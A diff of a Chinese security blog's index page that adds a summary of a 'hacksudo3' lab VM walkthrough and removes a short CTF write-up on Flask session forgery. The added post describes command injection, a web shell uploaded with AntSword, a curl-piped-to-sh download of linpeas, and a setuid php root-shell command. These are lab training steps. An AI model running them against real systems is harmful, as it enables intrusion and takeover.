@@ -172,6 +172,61 @@
         
 
 <div class="post">
+    <a href="/2023/08/07/hacksudo3%20%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
+        <h2 class="post-title">hacksudo3 通关详解</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/8/7
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>一开始桥接错网卡了 搞了半天 改回来就行了</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/77b085a4965945089e4efd752219fcd4.png" alt="在这里插入图片描述"></p>
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>扫个目录<br><img src="https://img-blog.csdnimg.cn/6a78d32b8bc746239c8cf3583c4ce9b4.png" alt="在这里插入图片描述"><br>大概看了一眼没什么有用的信息 然后对着login.php跑了一下弱口令 sqlmap<br>都没跑出来 那么利用点应该不在这 考虑到之前有过dirsearch字典太小扫不到东西的经历<br>换个gobuster扫一下<br><img src="https://img-blog.csdnimg.cn/3dee063911db44ce96cbcc491d0ac026.png" alt="在这里插入图片描述"><br>先看看generator.php<br><img src="https://img-blog.csdnimg.cn/a9025eb98b0445379fc124f0e753ffbe.png" alt="在这里插入图片描述">随便填点东西执行一下 感觉像命令注入<br><img src="https://img-blog.csdnimg.cn/c51178f60f214846af55040ad8f77d83.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bb57ad44e67047758e2f5fe366003b4b.png" alt="在这里插入图片描述"><br>尝试弹个shell<br>没成功<br>那就写了个一句话 然后用蚁剑传shell<br><img src="https://img-blog.csdnimg.cn/aeaa9d7243ee4884879b9e01449decf5.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fda42949852141f48c83230df31ecc10.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6a6885383b3d40bfa310e0efe06c5769.png" alt="在这里插入图片描述"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>优化shell<br><img src="https://img-blog.csdnimg.cn/9ea476d0bf444708a1febdf92d6655e2.png" alt="在这里插入图片描述"></p>
+<p>看看还有没有用户,有可能待会会切过去<br><img src="https://img-blog.csdnimg.cn/00a360113c734409afbdee01f52b3dfd.png" alt="在这里插入图片描述"><br>用linpeas枚举脆弱性<br><code>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code><br><img src="https://img-blog.csdnimg.cn/c864be3fe2cb4dbc8033971314fc5cde.png" alt="在这里插入图片描述"></p>
+<p>没看见特别显眼的<br><img src="https://img-blog.csdnimg.cn/7636f4070eaf40b58bcd57050d9334dd.png" alt="在这里插入图片描述"><br>版本过高<br>考虑到有个hacksudo的用户<br>再收集一波信息看看能不能切过去<br>发现有个hacksudo的文件 <img src="https://img-blog.csdnimg.cn/50502f6f887c49aebd25668c9bc0def7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0a7389c521ab462185fdd0474acd218e.png" alt="在这里插入图片描述"><br>有加密 一眼凯撒<br><img src="https://img-blog.csdnimg.cn/9d1b8d0b91174a96ba8c3195570fcecb.png" alt="试试"><br><img src="https://img-blog.csdnimg.cn/5d7b8c1ddb5c49a38264fce2174de9b9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0b55f6c69e6643899def33c14f9a1253.png" alt="在这里插入图片描述"></p>
+<p>没有sudo权限<br><img src="https://img-blog.csdnimg.cn/4b97b8f4a9494eefb8c1be96d0ff31cc.png" alt="在这里插入图片描述"><br>在work路径下发现sh文件<br>没执行权限<br>也没看见相关的计划任务<br>再传个linpeas枚举<br><img src="https://img-blog.csdnimg.cn/dfa91d083f1b478ab029c730db82e9b4.png" alt="在这里插入图片描述"><br>可以lxd提权<br><img src="https://img-blog.csdnimg.cn/696ebe4ba82647f79f404a46cc5753b1.png" alt="在这里插入图片描述"><br>也可以view 或 php提权<br>这里用php提权</p>
+<pre><code class="bash">CMD=&quot;/bin/sh&quot;
+./home/hacksudo/locker/php -r &quot;posix_setuid(0); system(&#39;$CMD&#39;);&quot;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/e187ecf8f2a44c7fbc974ae3193d7547.png" alt="在这里插入图片描述"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/08/07/hacksudo3%20%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2023/08/02/NSS%E5%88%B7web3/">
         <h2 class="post-title">NSS刷web3</h2>
     </a>
@@ -490,12 +545,12 @@ if(!isset($_GET[&#39;file&#39;])) &#123;
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
         </span>
         
     </div>
@@ -543,12 +598,12 @@ if(!isset($_GET[&#39;file&#39;])) &#123;
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
         </span>
         
     </div>
@@ -696,7 +751,7 @@ public class Main &#123;
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
         </span>
         
         <span class="tag">
@@ -752,7 +807,7 @@ chmod +x emergency
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
         </span>
         
         <span class="tag">
@@ -942,12 +997,12 @@ public class App
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
         </span>
         
         <span class="tag">
@@ -1175,12 +1230,12 @@ echo urlencode(serialize($pop));
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
         </span>
         
     </div>
@@ -1401,22 +1456,22 @@ echo urlencode(serialize($p)).&quot;\n&quot;;
         
         <span class="tag">
             
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
             <a href="/tags/python/" style="color: #03a9f4">python</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%89%8D%E7%AB%AF/" style="color: #ff7d73">前端</a>
+            <a href="/tags/%E5%89%8D%E7%AB%AF/" style="color: #00a596">前端</a>
         </span>
         
     </div>
@@ -1696,7 +1751,7 @@ print(long_to_bytes(m))
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #03a9f4">数学建模</a>
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #00a596">数学建模</a>
         </span>
         
     </div>
@@ -1807,72 +1862,21 @@ print(long_to_bytes(pow(c,d,n)))
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #03a9f4">数学建模</a>
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #00a596">数学建模</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
         </span>
         
     </div>
     <a href="/2023/06/05/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%20%E9%83%A8%E5%88%86crypto%E5%A4%8D%E7%8E%B0/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/06/04/Round#13%20web%E4%B8%93%E9%A1%B9%E9%83%A8%E5%88%86wp/">
-        <h2 class="post-title">Round#13 web专项部分wp</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/6/4
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="flask-jwt"><a href="#flask-jwt" class="headerlink" title="flask?jwt?"></a>flask?jwt?</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/a1bf23691f18f7422842fa37da057a66.png" alt="image-20230604100247293"></p>
-<p>忘记密码处有secretkey</p>
-<p>然后就是伪造session了,这里猜一下要什么</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/9d75ff2defcc7288b2435d3c35a3c247.png" alt="image-20230604105953099"></p>
-<p>最后应该是<code>_is_admin</code>有用,我没细看,当时平台卡麻了<br>指正:改<code>_user_id</code>为1</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/7c978dece0a1ae750913a40c64544289.png" alt="image-20230604105945576"></p>
-<h1 id="ez-factors"><a href="#ez-factors" class="headerlink" title="ez_factors"></a>ez_factors</h1><p>注意到可以拼接命令,但是执行的回显只有数字</p>
-<p>那么可以考虑读取后用od命令来转8进制读取</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/04b75cc59a770e17da91dc934a871934.png" alt="image-20230604121450662"></p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/2328d1a710b5739041db12c5b6ba7f1b.png" alt="image-20230604121516085"></p>
-<h2 id="flask-jwt-hard"><a href="#flask-jwt-hard" class="headerlink" title="flask?jwt?(hard)"></a>flask?jwt?(hard)</h2><p>这里当时拿到key了,但是被第一题的思路误导了,第一题不用猜伪造什么,因为我一开始<code>user_id</code>改的0,没成功然后乱试什么isadmin之类的<br><code>useri_id</code>改1就行,我早知道改改id试试了<br>这里在登录后看源码有个wor路由<br>去wor路由然后随便弄个非法的<code>session</code>就可以看到key 把报错那个展开<br><img src="https://img-blog.csdnimg.cn/e8644c8d2fdc43168ef26560f5a74e8b.png" alt="在这里插入图片描述"><br><code>hardgam3_C0u1d_u_f1ndM3????</code></p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好久没做web了,就出了两个最简单的,现在一看太菜了还是,信息收集那题我不知道只有一个文件读能干什么</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
-        </span>
-        
-    </div>
-    <a href="/2023/06/04/Round#13%20web%E4%B8%93%E9%A1%B9%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
 </div>
 
 
@@ -1891,6 +1895,9 @@ print(long_to_bytes(pow(c,d,n)))
     
     <a class="page-num" href="/page/7">7</a>
     
+    
+    <span class="page-omit">...</span>
+    <a class="page-num" href="/page/8">8</a>
     
     
     <a class="page-num" href="/page/6/">
